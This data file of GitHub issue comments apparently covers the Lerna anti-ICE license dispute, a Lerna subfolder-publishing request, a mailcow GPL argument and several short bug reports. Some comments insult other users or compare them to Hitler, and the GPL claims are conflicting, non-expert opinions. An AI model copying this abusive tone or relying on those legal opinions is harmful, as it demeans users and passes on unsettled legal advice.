lerna/lerna/1639/417824544,"Folks who use terms like ""virtue signaling"" might not realize that is incredibly politically charged. Also it's simply not true that restrictive clauses have no precedent in open source work. Everyone screaming that ""this is no longer open source"" needs to realize that A) we are not beholden to the OSI's definition of open source, and B) there is plenty of precedent with Commons Clause, Fair Source, License Zero, and even the original license for JSON (thanks to Mikeal Rogers [formerly of the Node.js Foundation] for pointing that out on Twitter). (source) (source) ",,False,False,1639
lerna/lerna/1639/417825380,"So we neither have a compelling reason for Jamie K. to have been kicked nor a compelling reason why the license was reverted. I am shocked. So to recap  All maintainers accepted the original pull request. There's absolutely prior art on doing this sort of license change. Jamie K.'s behavior was apparently considered bad, but not until big companies were involved. No one in charge of this has listed any behavior that violated in the current implemented code of conduct. We're still waiting on an official response to this issue, which was created because of (what is now) a clear attempt at silencing. Multiple employees from a company on the list swooped down to convince a maintainer to revert the change (but not before specifically moving to revert their company's inclusion in the list, awkward).  And the result?  An immense amount of character assassination The gamergate, anti-coc, and hard right crowd have been riled up A fork that will surely not see life longer than a week but will have eaten plenty of valuable engineering time A new surge of engineers who think ethics aren't their problem ESR is talking again  ",,False,False,1639
lerna/lerna/1639/417825724,The comments he made on other projects is a violation of the CoC and that's why he was removed. I think that may have been the nth time someone has mentioned that to you. So either you're illiterate or have an agenda. ,,False,False,1639
lerna/lerna/1639/417825914,@friend have you heard the phraee- will somebody please think of the children? That's it. Benevolent @friend is just thinking of the children [traffickers]. ,,False,False,1639
lerna/lerna/1639/417826130,@friend did we just say the exact same thing? @friend the image you posted is making me wonder if you have yet acted on @friend's mirror suggestion yet. ,,False,False,1639
lerna/lerna/1639/417826337,"I'll just point out a particular sentence from the original licence change  on ""helped"" I think there's quite a bit of needless character assassination going on. Perhaps James has made some unfortunate statements at different times, but in the context of this issue, it hardly looks like he has claimed personal ownership of Lerna or any other open source project. ",,False,False,1639
lerna/lerna/1639/417826501,"@friend He did. Here is one where he directly states Lerna is his project.  is one where he claims babel is his project  one  does it keep happening D?  is no character assassination going on, he acted shitty and is being called out on it. ",,False,False,1639
lerna/lerna/1639/417827208,"@friend -- no I said for people who are against the change being reverted to look at the fact that they are using MS products -- which makes them hypocrites. If you want to boycott Microsoft, maybe don't use their products -- or even better get off of GitHub. I'm not even sure what you said -- to be honest I stopped reading it after the first sentence. ",,False,False,1639
lerna/lerna/1639/417827484,@friend -- So for all this grandstanding you're doing -- why not delete your GitHub account...seriously -- MS will own GitHub soon. Also -- change your OS from Windows -- if you use that... ,,False,False,1639
lerna/lerna/1639/417827510,"@friend you and @friend agree, they were being sarcastic...... ",,False,False,1639
lerna/lerna/1639/417827497,"I agree that this is the intent, but in practice, that's not the impression I got from reading this thread so far. The majority of comments are either trolling or doing passive-aggressive witch hunts (and sadly I'm seeing this behaviour from both sides of the discussion, mind you). I'm not sure if there needs to be more clarity in terms of an RFC is typically supposed to look like (given that it is, admittedly, a new process in this specific org), which is why I offered my opinions on what is appropriate. If people disagree, they could potentially look at other orgs' RFC processes to get an idea of how one is structured (React and Ember both have RFC processes that could serve as reference, for example). In any case, I think we would all agree that all commenters should be following the basic rule of thumb of ""if a comment would be inappropriate in a technical discussion, it has no place in an RFC discussion either"". I understand this intent, but I have not seen anyone address the concerns about what happens with  non-blacklisted companies being unable to use such licensed software. This concern was dismissed as if it were a problem that did not exist, rather than a significant one (especially for something that is so geared towards big company workflows such as Lerna). For example, @friend (or whoever is the maintainer at any time)'s employer could disallow him from using a hypothetically non-OSI-compliant Lerna at work. If that was the only reason he was working on Lerna, there's a good chance the project would lose its steward and effectively die. Likewise, I might contribute a PR to a MIT-licensed Lerna if I need the fix for work, but I will certainly not do so if I'm not allowed to use it due to licensing issues in the first place. No, the point is that we can't possibly estimate the impact, both positive and negative. We cannot make assumptions that the positives will outweigh the negatives or vice versa. The argument for a non-OSS license boils down to ""something must be done, this is something, therefore it must be done"". No, it must not. Whatever was the latest heated Javascript-related topic of the week on Hacker News is statistically unlikely to be even remotely close to being an appropriate response to an issue that likely no one here has any real life understanding of, other than what they read on some news site while sipping their coffees. It's especially disingenuous to say this must be done, if the person saying so did not even bother to try to research what other things could have been done instead, or what is being done, even. To illustrate the level of myopia here, there was a PR on Jamie's repo to add Uber to the blacklist, despite the fact that Uber is donating rides and meals to families separated by ICE*. As I mentioned in an earlier comment, there's already a well established way of running non-OSS software pay for it. This very discussion is open because the maintainers feel that inclusion of all parties is of utmost importance to the success of this project. They could just tell everyone to go away, or even pull a uws** and they'd be entirely within their rights to do so. Using the privilege of having this forum to argue that the maintainers should adopt a restrictive license is biting the hand that feeds. I think the non-starter here is to suggest that maintainers ought to maintain a project that they themselves may not be able to use under some circumstances. ",,False,False,1639
lerna/lerna/1639/417827923,"@friend as I said perhaps he made some unfortunate statements - what I'm trying to say is that if you look at the license change PR where he elaborated, it does not look like he thinks he personally owns the project at the exclusion of anybody else. He did not push the change without review. When people say ""my"" thing, it can mean a lot of different things - its usually not helpful to draw strong conclusions from the use of that word. Looking at the commit history, it does look like he was heavily involved in the early days of Lerna. I assume he means ""my"" in a similar sense - ""Lerna is a project which I was heavily involved in and I share significant responsibility for creating"". ",,False,False,1639
lerna/lerna/1639/417828353,Oh Jesus nevermind -- I'm an idiot I guess joy -- apologies @friend ) ,,False,False,1639
lerna/lerna/1639/417829427,"@friend I would agree if this were the actual RFC thread, but this is actually just a thread requesting an RFC should exist in the first place. Therefore I don't think it's valid to judge peoples' comments here as what they would have said in an actual RFC. And yet the reason we have OSS licenses as a staple of modern software development today was the continued preaching of outcast mailing list users in the last few decades, and you could extend this to basically any successful political protest as well. There's also lots of not OSS software that is free as in beer. And I appreciate that this is true, but being ""non-OSS"" would not preclude this from happening by default anyway. @friend And yet Stallman's own license is one of the most restrictive and closed-door OSS licenses there is. He just closes the door on a different group of people the group of people that want to use or modify his code without sharing back their changes. There's not a fundamental difference between that and precluding groups for another reason. This is also why I think the OSI page on ""evil"", originated from the JSON license, is fairly crap. I think the ""do no evil line"" is also terrible because it's even less enforceable than what the MIT-ICE license was, but the discussion in OSS around being able to preclude wrongdoers from using code has been very backwards IMO. As I said, Lerna's own license change is not meant to harm ICE by itself in any significant way, it's meant to  Deal with the ethical concerns of allowing a harmful entity to use your code Show other OSS projects that this is a real dilemma and hopefully spark them to discuss and maybe take the same action  If many OSS projects do the same thing, then there could be real, large-scale change over time. None of those show a trollish intent behind the action at all, and in the actual PR that was made, the changes were discussed in a very professional manner, all (at the time available) protocols were followed, and a calm and deliberate reasoning was given. Being terse and (arguably) rude to companies over their using tools he contributed to does not constitute the action being trollish. ",,False,False,1639
lerna/lerna/1639/417830616,"@friend Sure, I'm sure you could argue Adolf was a pretty cool guy if you ignore all the other stuff he did and just focus on his gun control policy. 🔥 If you just excuse it as ""unfortunate"" then you're just trying to justify your own opinions. @friend The difference between having a strict license vs claiming it's open. As I said numerous times, if the goal is to have lerna be proprietary that's a different discussion. At the current time, and as far as I know, lerna plans to stay as an open source project. Then none of them are open source anymore. You have collectively made a proprietary license. We're not arguing that so it's a moot point to even mention. He made multiple issues in the same project that all state the same thing, linking to the same resources which are there to incite hatred from a group of people towards a company. See this definition My god, it's exactly what he did. ",,False,False,1639
lerna/lerna/1639/417832851,And we're done. I'm going to spend the rest of the long weekend restoring my mental health. I'll resume my pariah duties on Tuesday. ,,False,False,1639
lerna/lerna/901/313844623,"Hi, I have a same problem in a project developed with a lot of Angular 4 libraries. If dist folder cant' be symlinked directly, the services don't be injected correctly. I dislike this way proposed by angular (define a package in dist). But if customization of package dir can't be defined, Lerna can't be used with an angular project. ",,False,False,901
lerna/lerna/901/346394412,I recently tried using Lerna for the first time and immediately ran into this issue. Any heavy Typescript development is going to get hamstrung by the omission of this NPM feature. ,,False,False,901
lerna/lerna/901/239090644," Many libraries in the Angular ecosystem publish to NPM from a subdirectory that was cooked during the build process. The process is usually as followed - build the library in a subdirectory (i.e  directory) - copy package.json, license and readme to the  directory - do some package.json cleanups in the  directory (delete devDepedencies, move dependencies to peerDependencies, remove scripts...) - npm publish from the  directory.  I understand that it is not a common technique for node.js package developers but i think it is common for web package developers and my libraries uses the same technique..  While embedding  into our shared packages monorepo - [kaltura-ng]( I read a lot of issues in lerna and googled about this topic. I read carefully the conversation of issue #91 and even used the same subject with my issue. Unless I missed new issues that address this feature it was marked as 'wontfix' with a recommendation to use the 'package.jsonfiles' array instead.  The reasons for using this approach instead of  array are - Many known libraries in the Angular ecosystem does it ([angular/angular]( [ReactiveX/rxjs]( [cyclejs/cyclejs]( so they must have a reason. - There is a lot of hoo-ha/complexity with the way node.js resolve modules  for the **web projects** since during the bundling process you **must** refer to the same instance of the library. Unless the bundler (typescript, webpack etc...) provide a hack/workaround/solution to force the library to use its' own node_modules, it will not work. Publishing from sub-directory works just because the  not exists. - During development if the symlink is done against the root, when you import nested class which was not exported in the main index, you will need to refer to the  as part of the path . but once you publish from  folder directly, you should somehow fix the pass by removing the  during the tranpiling which is not a valid option. - The libraries being used as dependencies during development should be assigned as peerDependencies at runtime because you want the application to provide them.  so to recap, we cannot just publish the package with a  folder, we need to publish from  directly  There are some caveats that I could think about with my suggested approach 1. The dist folder must exists with a package.json inplace before the  process symlink the folders.  2. The build process should not delete the 'dist' folder, instead it should just clear its content otherwise the symlink of dependent libraries will be broken.  IMO those two caveats are manageable as 1. we can use a preinstall script to create the folder and a simple package.json file (with at least 'id','name'). 2. the build scripts should clear the folder content instead of  the folder itself.  ## Expected Behavior   when bootstrapping/publishing a package the package.json is being queried for the following config    if this config exists, it will symlink to that folder during bootstrap command and will publish from that folder during  publish command  using the 'config' attribute allow using the same configuration both in  and in other [node scripts]( already modified the 'bootstrap' command in a fork [esakal/lerna]( I didn't create a PR yet because I'm missing the 'publish' command. I will be happy to continue my work if you are going to consider this feature.  You can see it in action in our repo -  [kaltura-ng](   **NOTE** - your yarn version should be 0.24.6 and above  ## Current Behavior   n/a   ## Your Environment     Executable Version      2.0.0-rc.5    v0.24.6      OS Version     macOS El Capitan 10.11.6    ",,False,False,901
lerna/lerna/901/349032422,"Same issue here I ran into this problem, would love to get this feature, I am even ready to do a PR. @friend any thoughts? ",,False,False,901
lerna/lerna/901/349035196,"Have the same problem here, I’d love to have this feature, and I am willing to do a PR. @friend what are your thoughts? ",,False,False,901
lerna/lerna/901/350399903,"As far as I know this is the only way to accomplish ""flat"" package structure (without the  or  section in the import path) unless skipping / directories entirely, which isn't practicable if your source requires transpilation. Let's say I want to import only the  module from the  namespace inside my , what I would like it to look like is If the source is ts/jsx/esnext etc, the recommended way of distributing the package is to transpile it to a  directory (""npmDistDirectory"" in @friend's proposal), include  and publish. This doesn't seem to be possible with lerna at this moment, which is a pity. Instead I will need to transpile it to , reference it from the  prop in  and then accept the following import After spending precious time on your API design, naming convention etc, this is a bitter tradeoff. ",,False,False,901
lerna/lerna/901/350403877,"I don’t understand why this “flat” package structure is better than just another npm package. “big-obese-monolith” packages are an anti-pattern in npm. If you want to expose submodules directly, extract them into a separate package. Literally the reason Lerna was created in the first place. ",,False,False,901
lerna/lerna/901/350410630,"@friend I will not go into argument whether x is better than y - most often I am wrong. But if we ignore my poor choice of lorem-ipsum name (we can call it something else, such as ""tiny-lodash""), I can't really see why lerna should hinder the author from using a nested structure within a package and at the same time provide ""semantic imports"". I came here to evaluate lerna as a tool for managing JavaScript projects with multiple packages, not as a tool to limit me on how to structure the internals of my packages (whether good or bad). ",,False,False,901
lerna/lerna/901/350423290,"In my experience, as well as observation of community packages over many years, coupling consumption of a given export to the literal directory structure of a tarball is an extremely hostile anti-pattern. Especially nowadays with ES module exports and whatnot combined with tree-shaking module bundlers, there’s really no fundamental necessity for false-basedir publishing. Lerna is designed around the way npm works. Packages are published from the same directory as the package.json, and construct their tarball from metadata contained therein. Publishing from a different directory with a modified dependency tree is not idiomatic npm, and lerna will not support it. ",,False,False,901
lerna/lerna/901/350432846,"This will be a major limitation for TypeScript and Angular developers, and in fact some people using lerna with typescript had to do their own publish, or patch the existing implementation.  I myself want to publish from a subdirectory which does contain a  for several reasons; 1) I don't want to transpile my TS in the  folder because I'll end up having a messy file system. , , ,  all next to each other, and than to  after build will be a total mess. 2) I want to following Google's Angular Package format  Seperation of concerns, why should I have my  files within the same folder of the ? My folder structure ♠bash -- my-lib ---- package.json ---- src ------ index.ts ----dist ------ package.json ------ index.d.ts ------ index.metadata.json ------ esm2015 -------- index.js ------ esm5 -------- index.js ------ bundles -------- index.js So in reality i can publish from a subfolder as I do have a ",,False,False,901
lerna/lerna/901/354401772,"Author of several typescript modules here who has hit the exact same issue, all my modules publish from a  folder. Wish I'd known this before starting to use lerna! Would love this feature to be implemented, but will probably have to switch to something else instead now. ",,False,False,901
lerna/lerna/901/354461926,"I fail to see what typescript has to do with this non-idiomatic subdirectory pattern. You can publish npm modules with transpiled code and typings under  just fine, no mangling of package.json required. ",,False,False,901
lerna/lerna/901/354465000,"That won’t  work if you’d need secondary entry points like @friend/my-lib/testing On Fri, 29 Dec 2017 at 1645, Daniel Stockman notifications@friend.com wrote ",,False,False,901
lerna/lerna/901/356725527,"For those that are still trying to get ""flat-pack"" imports working  I was able to solve it by leveraging the , , and  scripts that were added in  me I got it working by - Disabling NPM publishing during the lerna publish command  Performing my linting and build during the  NPM script (or before) which would be built into a  folder Copy necessary files into the  folder during the  NPM script and then call . This is handled in a gulp file but I've simplified below. The  version has been bumped prior to the  script being called is only called if you do not include the  command to lerna publish     I still think a config option for  could be beneficial since it would allow a consumer to leverage the  lifecycle-hook which seems a little more intuitive. ",,False,False,901
lerna/lerna/901/358278048,that's why angular repos not using lerna ,,False,False,901
mailcow-dockerized/mailcow/2465/424307758,"In my cow I have made many changes and added new options, not knowing how to best update them with a new code on GitHub, without break other users who will have this issue how will fix it. Thank. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475702799,"You just stated that you don't know that's not a question; it's a statement. If your question is how to actually do this it would help to know how much experience with git-based development you have, so we can better assess on where to start explaining. If you've got enough experience andryyy's comment should help you out. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475703907,i don't think you underztond ,,False,False,2465
mailcow-dockerized/mailcow/2465/475704606,"Ok, @friend can help you out; he's the maintainer 😸. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475705956,"Actually, if you made changes to the code itself there should be an open repo (or otherwise publicly available current version of the code) of this per the license of this project. Where can we inspect this code? I see no open repositories under your GitHub account. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475707290,"I think he asking how to update Mailcow if you have done lots of changes to the code, I might wrong don't want to sound rude but there seem to be a bit of language barrier. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475707966,"@friend Oooh, ok. Well, as long as only configuration stuff is involved, there should be no issue updating, I think. (You should always backup anyway.) If functionality was added, he is bound by the license to make his code publicly available, though. I can't speak for @friend but in his stead I wouldn't want to support anyone who is violating the license. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475708815,Did ./update.sh it stoped working ,,False,False,2465
mailcow-dockerized/mailcow/2465/475709553,"This is the point in time where you save the logs of the update,restore your backup and show us what the logs say. Though I don't know if anyone might want to help you as long as you're violating the license. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475712258,"I don't think this should break anything, but we still can't help without some diagnostic output... Follow the issue template and if you think your rspamd scores make more sense you should create a PR. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475718019,@friend I don't think adding new functionality to Mailcow would count as a license violation even if they don't release the code as long as they are not distributing it.   ,,False,False,2465
mailcow-dockerized/mailcow/2465/475718528,"Please stop claiming that @friend violates the license. He's most likely not doing that. Simple stuff like the Dockerfiles and configurations is too trivial to be copyrightable, so the license mainly applies to  the scripts, web UI, etc. Besides that, the GPLv3 only requires you to provide the code if you redistribute the software (e.g. if someone started selling Mailcow for other people to run on their own servers), not if you are only running it (either for your own use or as a hosting company that provides managed Mailcow instances). This is different from the AGPLv3, which, for example, requires you to provide the code as soon as you are allowing someone to use the software over the network. These kinds of comments indeed do not help. Please provide a full explanation of your problem and all relevant logs. When you created a new issue, the template actually asked you to do precisely that. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475724692,Huh. ) Okay. Thought he wants to contribute code. ,,False,False,2465
mailcow-dockerized/mailcow/2465/475731012,"@friend @friend As stated in  is no mention that you don't need to make the code available after a modification of the code if you're only using it for yourself. Actually it suggests otherwise. That's why I didn't ever dig further into this. On the other hand we have this  means ""conveying"" here, as per the GPL  actually you're wrong. We have JavaScript as part of this repo. And now see this  we use Ajax calls the javascript part of the code is explicitly considered NOT to be trivial as per the link provided. Since you're making part of the GPL code available directly to the public just by visiting the mailcow site, you WILL have to disclose any changes to the code IMHO. Correct me with a reliable source please, if I missed something. I'm now even more confused about @friend's comment here  though 😖. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475741133,I don't think andryyy care if someone modify or add stuff to Mailcow unless they are posting screenshot or asking for help to fix issue caused by their modification. Even if andryyy did wanted ever bit of code from a user that  modified their Mailcow install it not like he's going to even know about it unless the person messages him saying I've modified your code you want a copy. ,,False,False,2465
mailcow-dockerized/mailcow/2465/475741859,That's why I mentioned  where he actually asked for it. ,,False,False,2465
mailcow-dockerized/mailcow/2465/475744204,I have close why still messageing ,,False,False,2465
mailcow-dockerized/mailcow/2465/475747898,"Did anyone teach you manners if allof (header contains ""X-GitHub-Sender"" ""Hickstead"") { discard; } that shoud keep my inbox clear of you. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475749505,"I'm willing to believe there was a big language-barrier problem (maybe auto translate) and all the talk of violating licenses may have scared Hickstead, so his comment about still messaging may not have been meant the way it came across. 👍 ",,False,False,2465
mailcow-dockerized/mailcow/2465/475752502,"Sorry, didn't want to scare anyone or get offtopicky. ( I'd be happy if anyone could cite something that disproves what I found out, though, just for clarity, because that's how I always interpreted Mailcow to behave in context of GPL. plus one ",,False,False,2465
mailcow-dockerized/mailcow/2465/475765797,"Your interpretation is probably a bit strict, @friend. Commonly one only insists on publishing the source code if someone provides (usually by selling) the software to someone else to run on their own computer. So all internal use is not affected. It's unclear to me whether the redistribution of the JS code also requires the publication of modifications to the server-side code. My guess is no (as the license also applies to each file individually, one can redistribute them individually), but that question can basically only be answered by a lawyer. I already locked this discussion, but since you are team members, you can continue commenting here. I just ask that we stick to the actual technical questions instead of discussing nitpicky licensing details that none of us is an expert on. ",,False,False,2465
mailcow-dockerized/mailcow/2465/475766572,Agreed. Thanks for clarifying. plus one ,,False,False,2465
miktex/MiKTeX/163/341800572,"Please note we will close your issue without comment if you delete, do not read or do not fill out the issue checklist below and provide all the required information. Checklist  [ ] I am reporting a bug others will be able to reproduce [ ] I have installed the latest MiKTeX updates [ ] I have checked the MiKTeX log files  Please replace this section with the required information  step-by-step reproduction instructions input files which are necessary to reproduce the bug your observations (command output, screenshots, ...) relevant log file snippets  ",,False,False,163
miktex/MiKTeX/163/405512405,"@friend  Why is it invalid? I need a solution to this problem. There is no way to edit this path, it is set by MiKTeX... ",,False,False,163
miktex/MiKTeX/163/405513242,This is an invalid report  You haven't checked the log files You didn't provide the required information  ,,False,False,163
minecolonies/ldtteam/2094/292059384,"Minecolonies version First detection  forge-1.12.2-14.23.1.2665-universal + minecolonies-universal-1.12.2-0.8.6905 ( and other version ) Lastest test  forge-1.12.2-14.23.1.2604-universal + minecolonies-universal-1.12.2-0.8.7200 Expected behavior No log, reduct log to minimum, place a option in config file for stop log, place this log in separated file.  run /mc colonies rsResetAll in Version 1.12.2-0.8.7193 ( read in description ) Same problem. Massive LOG file. 2531 entry in one second in file fml-junk-earlystartup.log [120716] [Server thread/DEBUG] [minecolonies] Attempting to find a Factory with Primary com.minecolonies.api.colony.requestsystem.factory.FactoryVoidInput -&gt; com.minecolonies.api.colony.requestsystem.data.IRequestSystemBuildingDataStore [120716] [Server thread/DEBUG] [minecolonies] Found matching Factory for Primary input type. Log file  Reducted file from a server start to stop. fml-junk-earlystartup.log ",,False,False,2094
mojo/kraih/1238/340595516," Mojolicious version 7.85 Perl version 5.28.0 Operating system macos  Steps to reproduce the behavior Just just the delay helper. Expected behavior A deprecation warning with explaination what to do, alternative options. How can i replace the helper code with what ? Actual behavior Warnings that delay helper is DEPRECATED. Problem warning without alternative options. User just panics that the code will stop to work one day. ",,False,False,1238
mojo/kraih/1238/404479635,Please use our official support channels. ,,False,False,1238
mojo/kraih/1238/404490887,"This discussion is meant to either change/introduce documentation or code. You can mark it as a suggestion, but closing it is not very helpful. For instance, NetOAuth2AuthorizationServer tests upon installation produce many of these warnings, just as an example. It affects other CPAN authors along the way, and web searches should end up here, i suppose. ",,False,False,1238
mojo/kraih/1238/404493264,"You did not propose any specific changes that could be discussed here. Until you reach that stage, please use our official support channels for discussions. ",,False,False,1238
mojo/mojolicious/1236/340189202, Mojolicious version 7.87 Perl version v5.26.1 Operating system ubuntu  Steps to reproduce the behavior perl -MMojoFile -le 'MojoFile-&gt;new(q(a.txt))-&gt;spurt(qq(\x{100}))' Expected behavior a.txt written with 2 bytes c4 80 Actual behavior get error Wide character in syswrite at /home/dk/perl5/perlbrew/perls/perl-5.26.1/lib/5.26.1/x86_64-linux/IO/Handle.pm line 483. a.txt is zero bytes ,,False,False,1236
mojo/mojolicious/1238/340595516," Mojolicious version 7.85 Perl version 5.28.0 Operating system macos  Steps to reproduce the behavior Just just the delay helper. Expected behavior A deprecation warning with explaination what to do, alternative options. How can i replace the helper code with what ? Actual behavior Warnings that delay helper is DEPRECATED. Problem warning without alternative options. User just panics that the code will stop to work one day. ",,False,False,1238
msgpack-python/msgpack/338/390906569,"Hello, I upgraded from 0.5.x to 0.6.x and somewhere in the middle the option max_array_len has been reduced from 2^32 -1 to 128*1024. My application now breaks because the generated lists are too big. Is there any way to set the option from within my application? Something like msgpack.max_array_len = xxx ? Thanks ",,False,False,338
msgpack-python/msgpack/338/447161401,Why don't you search before asking here? It is written in docstring and document. ,,False,False,338
msgpack-python/msgpack/338/447163761,See also ,,False,False,338
msgpack-python/msgpack/338/447193685,"Apologies, I did search the code, that's how I was able to pinpoint the issue. I was more looking for a global limit/configuration type of parameter, that I could set externally, like an environment variable. ",,False,False,338
msgpack-python/msgpack/338/458019767,"Do continue on this issue, how do you disable the limits? The documentation states So, is it  or is it ? Additionally, the function signature for  has it specified to defaulting to , which isn't either of the previous values. Does -1 mean 128*1024, or does it mean INT_MAX - 1 (like I'd expect it to). In general, default arguments should be the default value, or none (for cases of mutable values, like list), in which case it is explicitly documented that passing none/-1/whatnot is internally translated to \&lt;default value&gt;.. Basically, the verbiage in the documentation isn't clear how all the options interact, and what values mean what. Additionally, it doesn't really make sense to me to have / etc.... do anything if  is set to 0 (INT_MAX), and having to specify a pile of options just to turn off safety checking for contexts where I'm shipping LARGE chunks of data back and forth between endpoints I control is annoying. I have a context where I pretty regularly have 100+ MByte messages.  Really, if you're going to have checking in place, add another class like  that does this stuff. ",,False,False,338
msgpack-python/msgpack/338/458025916,"There are no way.  msgpack has it's upper bound (2**64).  So  is enough. Do you mean ""is it  or is it ? If  &gt;0, it's . If  == 0 (or other falthy values), it's . This usage of  is very common Python idiom. -1 is default value, and semantics for default value is described already. You don't have to ""specify a pile of options"".  (BTW, I don't think 5 is not ""a pile of"".  You can count it by one hand.) You can just use  (10GB) in such case.  If 10GB is not enough, you can use 100GB (if your machine have 100GB RAM). If I added it, people keep using  for untrusted source.  Security hole is keep living. Anyway, it's too late.  Making weaker than released version is not possible option. ",,False,False,338
msgpack-python/msgpack/338/458026781,"My point was that no, it's not. And you still haven't specified if -1 means  or . Reading the docs page , I can interpret it either way. I mean, if you're writing code, yeah, but it doesn't help in the docs. And the general default value for ""use defaults"" is . Using -1 seems like you're writing C code, not python. If I needed to not specify anything previously, and the functionality is pointless, yes, it is a pile of options. So 0 means , except for , where it means . It'd be nice if 0 meant the same thing when passed to , ,  and . Having them all act differently is a great recipe for confusion. I don't agree this is a problem in the first place.  You might as well just make  return None in all cases, for any input, otherwise someone will figure out how to break something. ",,False,False,338
msgpack-python/msgpack/338/458030979,"msgpack is JSON-like format.  Msgpack can be used anywhere JSON is used. It is used very widely, more than you think. And authenticated or not is not matter. That's why I released 0.6.1. ",,False,False,338
objectbox-java/objectbox/375/300141976,"Issue Basics  ObjectBox version (are using the latest version?) ? 1.4.1  Reproducibility [occurred once only | occasionally without visible pattern | always] always   Reproducing the bug Description Describe the situation in English in which you encounter the bug. Just create a project that uses the library via gradle. No need for code. The bug is that the IDE will warn about having these lines in gradle, even though I don't have them. They appear only when using this library. Here's a sample project MyApplication.zip The warnings you get Code *Provide the code triggering the bug. No need Logs &amp; stackstraces *Check if you have relevant logs and/or a stacktrace. No need Entities Provide the code for entities related to the bug (shorten to relevant parts). None Misc *Is there anything special about your app? No Did you find any workarounds to prevent the issue?* No ",,False,False,375
objectbox-java/objectbox/375/368420243,"In case this is an IDE/gradle issue, I've written about it here as well ",,False,False,375
objectbox-java/objectbox/375/372234399,"Thanks for reporting. The ObjectBox Gradle plugin did still add a dependency (jsr305) using the  configuration instead of the new . This was already fixed and will be released with the next version of the plugin (is in , but it has a bug, so wait for  or higher). -ut ",,False,False,375
objectbox-java/objectbox/375/372236093,"Is it available? If so, how can I use it? ",,False,False,375
objectbox-java/objectbox/375/372236481,"If it's not available, why close this? ",,False,False,375
objectbox-java/objectbox/375/372318151,"Closed because it is fixed (!= released), the fix will be released with the next update (likely 1.4.6). -ut ",,False,False,375
objectbox-java/objectbox/375/372319874,"How could I verify it's fixed, if it's not released... Therefore it doesn't make sense to close it. The issue still exists in all versions that are available. ",,False,False,375
objectbox-java/objectbox/375/372320987,"Just re-open the issue or comment if the fix is not successful. See our comments and the milestone info to learn what release an issue was resolved in. This is how we handle issues, please adapt.  -ut ",,False,False,375
objectbox-java/objectbox/375/372322805,"@friend I can't, because it's not available, and once it is available, I won't be notified about it. And even if I do get notified, how could I dig into all the issues to get here, if it's closed... It should have been this way  issue reported issue confirmed (and if not, closed) issue fixed bug fixed published, including telling here that it's published. anyone who subscribed to the bug report (me in this case) get notification and can check it back. confirmation that it indeed got fixed, and can be closed.  ",,False,False,375
openshot-qt/OpenShot/2189/367401978,"Spent a couple of hours making a video. All I did was add audio and text over the footage. I put everything in place. I watched it over to make sure everything was timed right. Everything was saved. I'd opened it up a couple of times having taken breaks and all... And then when it exports it doesn't look right at all. It's as if the clips had scrambled. I open the project file again, same thing. Everything was jumbled and half of the text I'd added was no longer there. It'd show the box but not the text. Haven't been able to produce a single video yet with this awful software and after uninstalling it, I never will. Windows 10, Asus, 8G of ram and all that other useless nonsense. Just updated the software today. ",,False,False,2189
openshot-qt/OpenShot/2189/427537263,"@friend We are sorry about the terrible experience you have had with our software. If you still willing to help sort out the issue can you please fill out the information below. Describe the bug A clear and concise description of what the bug is. System Details (please complete the following information)  Operating System / Distro [e.g. Windows 10, Linux Mint 17.1] OpenShot Version [e.g. 2.4.1]  To Reproduce Steps to reproduce the behavior  Go to '...' Click on '....' Scroll down to '....' See error  Expected behavior A clear and concise description of what you expected to happen. Screenshots If applicable, add screenshots to help explain your problem. Logs If you are experiencing a crash, please collect and attach logs of the problem. Additional context Add any other context about the problem here. ",,False,False,2189
orm/doctrine/7192/313696087,"I migrate a mysql db to sqlAnywhere(sqla) to test my app developed with Doctrine2. Acces to sqla works, DQL like $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.conlng = lng ); $query-&gt;setParameters(array(     'lng' =&gt; 'DE'             )); $result = $query-&gt;getResult(); also runs funny. $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.connum = num ); $query-&gt;setParameters(array(     'num' =&gt; '4'             )); $result = $query-&gt;getResult(); also no problems! BUT! $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.conlng = lng AND e.connum = num'); $query-&gt;setParameters(array(     'lng' =&gt; 'DE',     'num' =&gt; '4',             )); $result = $query-&gt;getResult(); doesn't work!! $result = empty! with operator OR it's the same problem! Any idea! # ",,False,False,7192
papirus-icon-theme/PapirusDevelopmentTeam/1453/417597962,"you don't want to respect us, we don't respect you ",,False,False,1453
phpstan/phpstan/1856/404256377,"I can't find any formal documentation for this project and the readme doesn't seem to give any indication as to what, exactly, this tool does. Compare this with phpstan-strict-rules, which is very clear and up-front about what it does, specifying in the head of the readme everything it checks for. Why is a plug-in more useful than the thing its plugging into? That seems backwards to me. ",,False,False,1856
phpstan/phpstan/1856/458515731,"I honestly don’t get your opinion. I recently removed a list of checks because it was outdated and caused a visual clutter  of this tool is a verification that it’s useful so I recommend you to try it out. What it does is in the first paragraph of the current README it. It catches whole classes of bugs even before you write tests for the code. It moves PHP closer to compiled languages in the sense that the correctness of each line of the code can be checked before you run the actual line. If you want to read more, there’s a link to Medium.com article which is also in the readme  this issue as invalid, while scratching my head... On Tue, 29 Jan 2019 at 1257, Bilge notifications@friend.com wrote -- Ondřej Mirtes ",,False,False,1856
phpstan/phpstan/1856/458516009,"Writing somewhere a list of checks is not a good fit for human consumption because it’s overwhelming. Rather than that, I welcome everyone to try it on their codebase... ",,False,False,1856
phpstan/phpstan/1856/458519147,"The popularity of the project is clear, but i'm inclined to agree with the OP here (despite phrasing not being very constructive). Exhaustive docs and lists of options are nice. Compare with rector (which is auto generated) or psalm, which do this very well. ",,False,False,1856
phpstan/phpstan/1856/458520650,"I’d love to hear about a use-case for this. It’s clear that static analysis is a must have for PHP projects now and it’s most valuable to know what kind of issues it finds on your projects. Instead of a long wall of text, there should be a better way to present it. Currently, the best way is to run PHPStan on your code. I don’t want to write something that no one will read. Instead, I’d like to design something that fulfills a use-case, but I don’t know what the use-case is. On Tue, 29 Jan 2019 at 1317, Ben Davies notifications@friend.com wrote -- Ondřej Mirtes ",,False,False,1856
